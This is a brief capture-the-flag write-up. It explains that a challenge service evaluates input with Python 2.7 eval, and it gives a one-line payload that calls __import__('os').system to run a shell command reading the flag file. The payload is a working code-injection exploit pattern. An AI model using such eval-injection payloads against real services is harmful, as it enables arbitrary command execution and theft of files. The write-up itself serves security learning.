Due to the service using python 2.7 eval we cant use a normal import but using `__import__` works and so we can cat the flag

```py
__import__('os').system('cat flag.txt')
```